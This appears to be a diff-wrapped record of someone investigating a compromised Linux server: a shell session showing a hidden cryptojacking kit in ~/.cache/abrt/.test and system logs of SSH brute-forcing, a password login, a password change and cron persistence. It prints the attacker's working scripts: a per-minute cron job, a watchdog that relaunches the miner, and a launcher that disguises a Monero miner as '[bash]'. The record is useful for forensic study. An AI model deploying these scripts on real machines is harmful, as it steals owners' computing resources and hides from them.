@@ -1,0 +1,175 @@
+[test@eutheria .test]$ ll ~/.cache/abrt/.test
+total 8440
+-rwxrwxr-x 1 test test 3880328 Aug 29 19:25 a.out
+-rwxr-xr-x 1 test test     286 Jun  7 22:52 autorun
+-rwxr-xr-x 1 test test 3876568 Apr  5 05:42 bash
+-rwxrwxr-x 1 test test       5 Aug 24 02:19 bash.pid
+-rwxrwxr-x 1 test test      59 Aug 24 02:19 cron
+-rwxrwxr-x 1 test test      29 Aug 24 02:19 dir
+-rwxr-xr-x 1 test test   15125 Feb 21  2016 h32
+-rwxr-xr-x 1 test test  838583 Feb 21  2016 h64
+-rwxr-xr-x 1 test test     425 Aug 24 01:46 run
+-rwxrwxr-x 1 test test     188 Aug 24 02:19 upd
+
+[test@eutheria .test]$ cat cron
+* * * * * /home/test/.cache/abrt/.test/upd >/dev/null 2>&1
+[test@eutheria .test]$ cat upd
+#!/bin/sh
+if test -r /home/test/.cache/abrt/.test/bash.pid; then
+pid=$(cat /home/test/.cache/abrt/.test/bash.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null
+[test@eutheria .test]$ car run
+bash: car: command not found...
+Similar command is: 'sar'
+[test@eutheria .test]$ cat run
+#!/bin/bash
+
+proc=`nproc`
+ARCH=`uname -m`
+HIDE="[bash]"
+
+if [ "$ARCH" == "i686" ];       then
+        ./h32 -s $HIDE ./bash -c 1 -t $proc -M stratum+tcp://dunhill9999%40hotmail.com:x@xmr.pool.minergate.com:45560/xmr >>/dev/null &
+elif [ "$ARCH" == "x86_64" ];   then
+        ./h64 -s $HIDE ./bash -c 1 -t $proc -M stratum+tcp://dunhill9999%40hotmail.com:x@xmr.pool.minergate.com:45560/xmr >>/dev/null &
+fi
+echo $! > bash.pid
+
+[test@eutheria .test]$ ./bash -c 1 -t 2 -M stratum+tcp://dunhill9999%40hotmail.com:x@xmr.pool.minergate.com:45560/xmr
+YAM - Yet Another Miner by yvg1900
+yam M7v-linux64-generic/yvg1900
+**********************************************************************************************************
+* Supported coins: PTS MMC MAX GRS DMD DVK MYR BCN QCN FCN XMR                                           *
+* Author: yvg1900 (Twitter @yvg1900)                                                                     *
+* XPT protocol: jh (http://ypool.net)                                                                    *
+*                                                                                                        *
+* Addresses for Thanks and Donations:                                                                    *
+*   PTS: PZxsEQoiMeB6tHcW2ZySBEiCPio1WkxbEL                                                              *
+*   XPM: AW2388DEWNEfMH4rP9kcj9yKcMq1QywYT4                                                              *
+*   DTC: D6PmUogMigWvXurgFTqm5VLxQeVpXdYQj3                                                              *
+*   MMC: MVk7PuJCa9o6qTYeiQRJDd3uHxKXMrQuU6                                                              *
+*   LTC: Lby4YjhcAxhmbsdHFb4nYydrwGoiJezZt1                                                              *
+*   BTC: 1FxekeK5La7AuF3oxiLzPKnjXyLMrux6VT                                                              *
+*   NMC: N9KXqmzEqP7gB2dGHpEZiRMgFjUHNM38FR                                                              *
+*   MAX: mTEsqg9dp3U9YXwduKxhhhDx1TRPBcNRvA                                                              *
+*   NRS: 9qwyC34MCZ9XGopaNDNTnaMBtjAZhHvBd3                                                              *
+*   GRS: FpHaQNJ2nMUc2kgBbzYue13E9VUfL8YbQp                                                              *
+*   DMD: dEQZa7W7AczvUsjJkvWWrim1j8ZtgbAwXv                                                              *
+*   DVK: D9o66V4h75JzWNpsaPidmKFVgwEf2DcDAX                                                              *
+*   MYR: MFDpLPThL6D6vtWW42XobFNBpPdrJFPQb6                                                              *
+*   XMR: 45w9aqVA6iVeMJ6jVHZPEyPqgVnBEAGhBBqGAW9ncXp44qbZy9vXkd2KpqYwcyVTQHF1kaSJm97GyceP3Y2dRMd7E9gyuZf *
+*   BCN: 2AcGMZmmNWTiLvAg5n7ywMCAxXTxysYGsi1xzba2ok4UPccWTLqRyKN7EnQYUpEWpqBw1c9EVZrqo2CUG8f8mbjG5NA9njF *
+*   QCN: 1V6wZP6aycYPbeafHxPcvaQfGs4M5kabHDQoTEsyCTT3HjccMyQbvEVNPoJuRc79XrPRYWESiAezyipWojpZ8bii3kczNgW *
+*   FCN: 6rNjXkY5YQzWiTMmDUbL5gYTWx9UTdUMSA98S1G3cTmhZN9Xp6kq4woGeoK5Q8B3fPZV6TFKs36zdHpZnYxA4BFK3fLpJzW *
+**********************************************************************************************************
+Can not load config file [1]
+Miner version: yam M7v-linux64-generic/yvg1900
+Checking target [stratum+tcp://dunhill9999%40hotmail.com:x@xmr.pool.minergate.com:45560/xmr]...
+Target OK
+Checking XMR optimizations compatibility...
+OK: XMR optimizations are compatible
+Monero: Determine Algorithm Variation by finetuning
+Using 2 CPU mining threads
+  Will mine 12 rounds for miner developers to support development of the next version
+  Follow @yvg1900 on Twitter to get information on new version availability on time
+STRATUM-RPC2: Logged in with dunhill9999@hotmail.com
+New Monero Block nTime 1504009614
+Monero Aggregated Hash/sec: ?; Rounds Complete/Incomplete: 0/0, Donated Complete/Incomplete: 0/0; Config/Worker Hash/sec: ?/? on 0 rounds with AV=1, ART=? ms; Fine-tuning: IN PROGRESS, AV/RT: 1/0, Best AV/RT: 1/0
+  xmr.pool.minergate.com: On-line, Shares Submitted 0, Accepted 0
+Share found!
+Share found!
+^CLeaving miner...
+
+
+
+[root@eutheria ~]# journalctl --since `date +"%Y-%m-%d" --date "last week"`
+
+Aug 23 17:31:48 eutheria sshd[25262]: Invalid user nu from 128.199.69.55
+Aug 23 17:31:48 eutheria sshd[25262]: input_userauth_request: invalid user nu [preauth]
+Aug 23 17:31:48 eutheria sshd[25262]: pam_unix(sshd:auth): check pass; user unknown
+Aug 23 17:31:48 eutheria sshd[25262]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=128.199.69.55
+Aug 23 17:31:50 eutheria sshd[25262]: Failed password for invalid user nu from 128.199.69.55 port 52647 ssh2
+Aug 23 17:31:50 eutheria sshd[25262]: pam_unix(sshd:auth): check pass; user unknown
+Aug 23 17:31:52 eutheria sshd[25262]: Failed password for invalid user nu from 128.199.69.55 port 52647 ssh2
+Aug 23 17:31:53 eutheria sshd[25262]: pam_unix(sshd:auth): check pass; user unknown
+Aug 23 17:31:55 eutheria sshd[25262]: Failed password for invalid user nu from 128.199.69.55 port 52647 ssh2
+Aug 23 17:31:56 eutheria sshd[25262]: Connection closed by 128.199.69.55 [preauth]
+Aug 23 17:31:56 eutheria sshd[25262]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=128.199.69.55
+Aug 23 17:36:13 eutheria sshd[25328]: Accepted password for test from 128.199.69.55 port 48311 ssh2
+Aug 23 17:36:13 eutheria systemd[1]: Created slice user-1008.slice.
+Aug 23 17:36:13 eutheria systemd[1]: Starting user-1008.slice.
+Aug 23 17:36:13 eutheria systemd-logind[1332]: New session 6698 of user test.
+Aug 23 17:36:13 eutheria systemd[1]: Started Session 6698 of user test.
+Aug 23 17:36:13 eutheria systemd[1]: Starting Session 6698 of user test.
+Aug 23 17:36:13 eutheria sshd[25328]: pam_unix(sshd:session): session opened for user test by (uid=0)
+Aug 23 17:36:19 eutheria sshd[25328]: pam_unix(sshd:session): session closed for user test
+Aug 23 17:36:19 eutheria systemd-logind[1332]: Removed session 6698.
+Aug 23 17:36:19 eutheria systemd[1]: Removed slice user-1008.slice.
+Aug 23 17:36:19 eutheria systemd[1]: Stopping user-1008.slice.
+
+
+Aug 23 22:46:49 eutheria sshd[39106]: reverse mapping checking getaddrinfo for 45.76.93.115.vultr.com [45.76.93.115] failed - POSSIBLE BREAK-IN ATTEMPT!
+Aug 23 22:46:51 eutheria sshd[39106]: Accepted password for test from 45.76.93.115 port 57997 ssh2
+Aug 23 22:46:51 eutheria systemd[1]: Created slice user-1008.slice.
+Aug 23 22:46:51 eutheria systemd[1]: Starting user-1008.slice.
+Aug 23 22:46:51 eutheria systemd-logind[1332]: New session 6837 of user test.
+Aug 23 22:46:51 eutheria systemd[1]: Started Session 6837 of user test.
+Aug 23 22:46:51 eutheria systemd[1]: Starting Session 6837 of user test.
+Aug 23 22:46:51 eutheria sshd[39106]: pam_unix(sshd:session): session opened for user test by (uid=0)
+Aug 23 22:46:52 eutheria dbus[1335]: [system] Activating service name='org.freedesktop.problems' (using servicehelper)
+Aug 23 22:46:52 eutheria dbus-daemon[1335]: dbus[1335]: [system] Activating service name='org.freedesktop.problems' (using servicehelper)
+Aug 23 22:46:52 eutheria dbus[1335]: [system] Successfully activated service 'org.freedesktop.problems'
+Aug 23 22:46:52 eutheria dbus-daemon[1335]: dbus[1335]: [system] Successfully activated service 'org.freedesktop.problems'
+Aug 23 22:47:18 eutheria sshd[39106]: pam_unix(sshd:session): session closed for user test
+Aug 23 22:47:18 eutheria systemd-logind[1332]: Removed session 6837.
+Aug 23 22:47:18 eutheria systemd[1]: Removed slice user-1008.slice.
+Aug 23 22:47:18 eutheria systemd[1]: Stopping user-1008.slice.
+
+
+Aug 24 02:17:52 eutheria sshd[918]: reverse mapping checking getaddrinfo for 45.76.93.115.vultr.com [45.76.93.115] failed - POSSIBLE BREAK-IN ATTEMPT!
+Aug 24 02:17:54 eutheria sshd[918]: Accepted password for test from 45.76.93.115 port 58936 ssh2
+Aug 24 02:17:54 eutheria systemd[1]: Created slice user-1008.slice.
+Aug 24 02:17:54 eutheria systemd[1]: Starting user-1008.slice.
+Aug 24 02:17:54 eutheria systemd-logind[1332]: New session 6940 of user test.
+Aug 24 02:17:54 eutheria systemd[1]: Started Session 6940 of user test.
+Aug 24 02:17:54 eutheria systemd[1]: Starting Session 6940 of user test.
+Aug 24 02:17:54 eutheria sshd[918]: pam_unix(sshd:session): session opened for user test by (uid=0)
+Aug 24 02:17:55 eutheria dbus[1335]: [system] Activating service name='org.freedesktop.problems' (using servicehelper)
+Aug 24 02:17:55 eutheria dbus-daemon[1335]: dbus[1335]: [system] Activating service name='org.freedesktop.problems' (using servicehelper)
+Aug 24 02:17:55 eutheria dbus[1335]: [system] Successfully activated service 'org.freedesktop.problems'
+Aug 24 02:17:55 eutheria dbus-daemon[1335]: dbus[1335]: [system] Successfully activated service 'org.freedesktop.problems'
+Aug 24 02:17:55 eutheria run-parts(/etc/cron.hourly)[990]: finished 0yum-hourly.cron
+Aug 24 02:17:55 eutheria systemd[1]: Removed slice user-0.slice.
+Aug 24 02:17:55 eutheria systemd[1]: Stopping user-0.slice.
+Aug 24 02:18:11 eutheria passwd[994]: pam_unix(passwd:chauthtok): password changed for test
+Aug 24 02:18:12 eutheria gnome-keyring-daemon[997]: couldn't connect to dbus session bus: Unable to autolaunch a dbus-daemon without a $DISPLAY for X11
+Aug 24 02:18:12 eutheria gnome-keyring-daemon[997]: couldn't connect to dbus session bus: Unable to autolaunch a dbus-daemon without a $DISPLAY for X11
+Aug 24 02:18:12 eutheria passwd[994]: gkr-pam: changed password for login keyring
+Aug 24 02:18:12 eutheria passwd[994]: gkr-pam: stopped the daemon
+Aug 24 02:19:11 eutheria crontab[1088]: (test) REPLACE (test)
+Aug 24 02:19:11 eutheria crontab[1089]: (test) LIST (test)
+Aug 24 02:20:01 eutheria systemd[1]: Started Session 6942 of user test.
+Aug 24 02:20:01 eutheria systemd[1]: Starting Session 6942 of user test.
+Aug 24 02:20:01 eutheria CROND[1109]: (test) CMD (/home/test/.cache/abrt/.test/upd >/dev/null 2>&1)
+Aug 24 02:20:01 eutheria systemd[1]: Removed slice user-0.slice.
+Aug 24 02:20:01 eutheria systemd[1]: Stopping user-0.slice.
+Aug 24 02:20:19 eutheria sshd[918]: pam_unix(sshd:session): session closed for user test
+Aug 24 02:21:01 eutheria systemd[1]: Started Session 6944 of user test.
+Aug 24 02:21:01 eutheria systemd[1]: Starting Session 6944 of user test.
+Aug 24 02:21:01 eutheria CROND[1146]: (test) CMD (/home/test/.cache/abrt/.test/upd >/dev/null 2>&1)
+Aug 24 02:22:01 eutheria systemd[1]: Started Session 6945 of user test.
+Aug 24 02:22:01 eutheria systemd[1]: Starting Session 6945 of user test.
+Aug 24 02:22:01 eutheria CROND[1166]: (test) CMD (/home/test/.cache/abrt/.test/upd >/dev/null 2>&1)
+Aug 24 02:23:01 eutheria systemd[1]: Started Session 6946 of user test.
+Aug 24 02:23:01 eutheria systemd[1]: Starting Session 6946 of user test.
+Aug 24 02:23:01 eutheria CROND[1181]: (test) CMD (/home/test/.cache/abrt/.test/upd >/dev/null 2>&1)
+Aug 24 02:24:01 eutheria systemd[1]: Started Session 6947 of user test.
+Aug 24 02:24:01 eutheria systemd[1]: Starting Session 6947 of user test.
+Aug 24 02:24:01 eutheria CROND[1200]: (test) CMD (/home/test/.cache/abrt/.test/upd >/dev/null 2>&1)
+Aug 24 02:25:01 eutheria systemd[1]: Started Session 6949 of user test.
+Aug 24 02:25:01 eutheria systemd[1]: Starting Session 6949 of user test.
